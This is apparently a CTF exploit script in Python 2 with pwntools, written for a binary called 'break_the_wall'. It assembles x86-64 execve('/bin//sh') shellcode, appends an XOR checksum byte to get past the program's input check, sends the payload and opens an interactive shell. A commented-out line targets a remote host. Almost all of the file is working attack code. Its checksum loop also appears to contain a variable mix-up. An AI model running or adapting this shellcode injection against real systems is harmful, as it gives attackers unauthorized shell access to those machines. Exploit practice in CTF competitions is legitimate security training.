from pwn import *
elf=ELF("break_the_wall")
io=elf.process()
#io=remote("123.207.32.26",9004)
libc=elf.libc
#libc=ELF("")
#context.log_level='debug'
context.bits=64

sla=io.sendlineafter
sl=io.sendline
sa=io.sendafter
ru=io.recvuntil
shell=io.interactive

shellcode=asm('xor rsi,rsi')
shellcode+=asm('xor rdx,rdx')
shellcode+=asm('xor rax,rax')
shellcode+=asm('push rax')
shellcode+=asm('push rax')
shellcode+=asm('push rax')
shellcode+=asm('mov rbx,0x68732f2f6e69622f')
shellcode+=asm('push rbx')
shellcode+=asm('push rsp')
shellcode+=asm('pop rdi')
shellcode+=asm('mov al,0x3b')
shellcode+=asm('syscall')
print len(shellcode)

'''
shellcode=asm('xor rsi,rsi')
shellcode+=asm('xor rdx,rdx')
shellcode+=asm('xor rax,rax')
shellcode+=asm('push rax')
shellcode+=asm('push rax')
shellcode+=asm('mov rbx,0x68732f2f6e69622f')
shellcode+=asm('push rbx')
shellcode+=asm('mov rdi,rsp')
shellcode+=asm('mov al,0x3b')
shellcode+=asm('syscall')
print len(shellcode)
'''

temp=0
for i in range(15):
	temp^=ord(shellcode[2*i])

temp1=0
for i in range(14):
	temp^=ord(shellcode[2*i+1])

shellcode+=chr(temp^temp1)
print len(shellcode)
io.sendafter('ask?\n',shellcode)
shell()
